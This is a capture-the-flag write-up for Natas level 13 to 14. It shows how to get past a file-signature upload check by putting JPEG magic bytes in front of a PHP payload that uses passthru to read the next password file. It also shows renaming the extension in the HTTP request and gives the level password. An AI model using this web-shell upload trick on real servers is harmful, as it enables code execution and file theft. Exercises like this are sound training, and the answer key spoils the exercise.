# Level 13 to Level 14

Similar to the previous level, although it checks for [signature of the file](https://en.wikipedia.org/wiki/List_of_file_signatures)

Use a Hexeditor and write the jpg image signature as first bytes, then continue with php code
```
00000000  ff d8 ff e0 00 10 4a 46  49 46 00 01 0a 3c 3f 70  |......JFIF...<?p|
00000010  68 70 20 0a 65 63 68 6f  20 70 61 73 73 74 68 72  |hp .echo passthr|
00000020  75 28 22 63 61 74 20 2f  65 74 63 2f 6e 61 74 61  |u("cat /etc/nata|
00000030  73 5f 77 65 62 70 61 73  73 2f 6e 61 74 61 73 31  |s_webpass/natas1|
00000040  34 22 29 3b 0a                                    |4");.|
00000045
```
Modify the extension to be `php` instead of `jpg` in HTTP payload, before seding it

`Lg96M10TdfaPyVBkJdjymbllQ5L6qdl1`